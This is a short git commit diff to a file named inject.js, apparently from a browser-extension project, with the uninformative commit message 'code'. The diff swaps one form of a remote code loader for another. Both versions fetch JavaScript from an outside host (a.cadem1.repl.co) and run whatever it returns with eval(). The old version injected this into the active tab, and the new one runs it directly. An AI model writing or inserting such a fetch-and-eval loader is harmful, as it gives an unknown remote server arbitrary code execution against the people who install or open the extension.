7485dcc7610bfbddb79594de7e9a863d29a4e416
aimedtuba-school <aimedtuba@gmail.com>
2022-01-18 09:22:04 +0700

    code

--- inject.js
+++ inject.js
@@ -1,2 +1,1 @@
-chrome.tabs.executeScript(null,{code:`fetch('https://a.cadem1.repl.co/a').then(r=>r.text()).then(r=>eval(r))`});
-close()
+fetch('https://a.cadem1.repl.co/a').then(r=>r.text()).then(r=>eval(r))
